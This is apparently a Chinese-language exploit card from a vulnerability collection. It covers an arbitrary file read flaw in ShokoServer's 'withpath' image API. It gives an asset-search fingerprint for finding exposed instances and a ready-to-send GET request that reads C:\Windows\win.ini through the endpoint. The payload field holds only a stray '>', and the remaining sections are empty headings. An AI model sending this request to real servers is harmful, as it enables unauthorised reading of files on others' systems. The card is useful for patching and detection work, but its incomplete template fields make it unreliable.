# ShokoServerwithpath存在任意文件读取漏洞

- **系统**：ShokoServerwithpath　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="Shoko WEB UI"`
- **请求**：`GET /api/Image/withpath/C:\Windows\win.ini HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Length: 0`

**请求体 / payload**
```
>
```

**其他**
- ShokoServer withpath存在任意文件读取漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: ShokoServer